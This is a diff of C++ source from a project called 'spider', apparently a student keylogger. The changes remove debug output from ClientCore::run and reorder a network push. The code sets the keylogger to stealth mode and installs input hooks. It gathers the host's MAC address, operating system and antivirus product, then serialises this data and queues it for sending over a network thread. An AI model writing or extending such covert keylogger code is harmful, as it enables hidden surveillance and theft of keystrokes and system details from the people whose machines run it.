@@ -30,36 +30,27 @@ void spider::ClientCore::run()
   std::unique_ptr<spider::IThread>	thread(boost::make_unique<BoostThread>());
   std::unique_ptr<spider::IThread>	threadnet(boost::make_unique<BoostThread>());
 
-  std::cout << "Before setting KeyLogger\n";
   running = true;
   _keylogger->stealth();
   _keylogger->initHooks();
   _keylogger->getMacAddr();
   _keylogger->getOperatingSystem();
   _keylogger->getAntiVirus();
-  std::cout << "After setting KeyLogger\n";
-  spider::BufferSender::BufferSenderInstance().push(spider::Serializer::getSerializer().get_string_from_ptree(spider::Serializer::getSerializer().serialize(*(_keylogger->getInfos()))));
-  std::cout << "Push sender instance\n";
   if (threadnet)
   {
-    std::cout << "threadNet exist" << std::endl;
     threadnet.get()->createNetThread();
   }
   if (thread)
   {
-    std::cout << "thread exists" << std::endl;
     thread.get()->createThread(_proto);
   }
-  std::cout << "Create thread done\n";
+  spider::BufferSender::BufferSenderInstance().push(spider::Serializer::getSerializer().get_string_from_ptree(spider::Serializer::getSerializer().serialize(*(_keylogger->getInfos()))));
   while (running)
   {
-    std::cout << "Running Get Message\n";
     if (!GetMessage(&msg, nullptr, 0, 0))
     {
-      std::cout << "In GetMessage" << std::endl;
       running = false;
     }
-    std::cout << "Begin Translation\n";
     TranslateMessage(&msg);
     DispatchMessage(&msg);
   }
